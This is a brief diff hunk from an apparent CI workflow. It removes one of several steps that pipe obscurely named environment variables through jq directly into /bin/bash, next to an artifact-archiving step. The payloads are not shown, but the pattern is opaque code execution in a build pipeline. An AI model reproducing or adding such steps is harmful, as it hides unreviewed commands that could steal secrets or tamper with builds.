@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$rn6" | jq -r .h443 | /bin/bash
           printf '%s' "$u71" | jq -r .b148 | /bin/bash
           echo $xkol1217 | jq -r .bytm25 | /bin/bash
-          printf '%s' "$pp2575" | jq -r .vlix4358 | /bin/bash
           echo $um352 | jq -r .ps29 | /bin/bash
 
       - name: Archive artifact
